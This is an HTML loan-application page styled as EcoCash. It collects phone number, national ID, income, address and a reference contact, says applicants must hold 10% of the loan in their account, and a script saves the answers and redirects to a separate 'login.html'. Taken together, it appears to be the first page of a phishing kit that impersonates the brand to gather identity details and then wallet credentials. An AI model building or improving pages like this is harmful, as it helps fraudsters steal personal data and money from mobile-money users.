<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash Loan Application</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  :root { --bg:#dfeeff; --card:#fff; --muted:#6b7280; --accent:#1766ff; --round:14px; }
  body{font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#e8f2ff,#cfe6ff);margin:0;padding:36px;display:flex;justify-content:center}
  .wrap{width:100%;max-width:820px}
  .card{background:var(--card);border-radius:var(--round);padding:26px;box-shadow:0 12px 30px rgba(9,30,66,0.06)}
  .logo{height:48px;display:block;margin:0 auto 10px}
  h1{text-align:center;color:#1851d3;margin:6px 0 6px;font-size:28px}
  p.lead{text-align:center;color:var(--muted);margin:0 0 14px;font-size:13px}
  .note{background:#fff3cd;border-left:6px solid #ffd84d;padding:10px;border-radius:8px;color:#7a5f00;margin:12px 0}
  form{display:grid;grid-template-columns:1fr;gap:12px}
  label{display:block;font-size:13px;color:#374151}
  .req{color:#d04444;margin-right:6px}
  input,select,textarea{width:100%;padding:10px 12px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;box-sizing:border-box}
  .small{font-size:12px;color:var(--muted)}
  .btn{background:var(--accent);color:#fff;padding:12px;border-radius:10px;border:0;font-weight:600;cursor:pointer;margin-top:10px;width:100%}
  .row{display:flex;gap:12px}
  @media(min-width:760px){ form{grid-template-columns:1fr 1fr} textarea{grid-column:1/3} .actions{grid-column:1/3} }
</style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <!-- logo using uploaded file path -->
      <img src="sandbox:/mnt/data/eco.png" alt="EcoCash logo" class="logo" onerror="this.style.display='none'">

      <h1>EcoCash Loan Application</h1>
      <p class="lead">Please fill in required fields. All information is kept confidential and used only for loan processing and verification.</p>

      <div class="note">Important: You must have at least <strong>10%</strong> of the loan amount you want in your EcoCash account.</div>

      <form id="loanForm">
        <!-- PHONE-FIRST: phone on top -->
        <label><span class="req">★</span>Phone Number
          <input name="phone" id="phone" required placeholder="+2637..." value="+263" />
        </label>

        <label><span class="req">★</span>Full Name
          <input name="fullName" required placeholder="John Doe" />
        </label>

        <label><span class="req">★</span>National ID / Passport
          <input name="nationalId" required placeholder="ID or Passport number" />
        </label>

        <label>Email Address
          <input name="email" type="email" placeholder="you@example.com" />
        </label>

        <label>Date of Birth
          <input name="dob" type="date" />
        </label>

        <label>Residential Address
          <input name="address" />
        </label>

        <label>Employment Status
          <select name="employment">
            <option>Employed</option>
            <option>Self-employed</option>
            <option>Unemployed</option>
            <option>Student</option>
          </select>
        </label>

        <label>Employer / Business Name
          <input name="employer" />
        </label>

        <label>Monthly Income (USD)
          <input name="income" />
        </label>

        <label>Loan Type
          <select name="loanType">
            <option>Personal Loan</option>
            <option>Business Loan</option>
            <option>Emergency Loan</option>
          </select>
        </label>

        <label>Loan Amount (USD)
          <input name="loanAmount" placeholder="e.g. 100" />
        </label>

        <label class="full">Additional Details
          <textarea name="details"></textarea>
        </label>

        <label>Reference Name
          <input name="refName" />
        </label>

        <label>Reference Phone
          <input name="refPhone" />
        </label>

        <label style="grid-column:1/3;display:flex;align-items:center;gap:8px;margin-top:6px">
          <input type="checkbox" name="agree" value="yes" />
          <span class="small">I confirm that the information provided is true and I agree to the EcoCash Loans terms and conditions.</span>
        </label>

        <div class="actions" style="grid-column:1/3">
          <button class="btn" type="submit" id="continueBtn">Continue with EcoCash</button>
        </div>
      </form>
    </div>
  </div>

<script>
  // ensure phone default +263 (in case browsers clear value)
  const phoneInput = document.getElementById('phone');
  if (!phoneInput.value || phoneInput.value.trim() === '') phoneInput.value = '+263';

  // Submit -> save loan form and go to login
  document.getElementById('loanForm').addEventListener('submit', function(e){
    e.preventDefault();
    const fd = new FormData(e.target);
    const obj = Object.fromEntries(fd.entries());
    sessionStorage.setItem('loanForm', JSON.stringify(obj));
    window.location.href = 'login.html';
  });
</script>
</body>
</html>
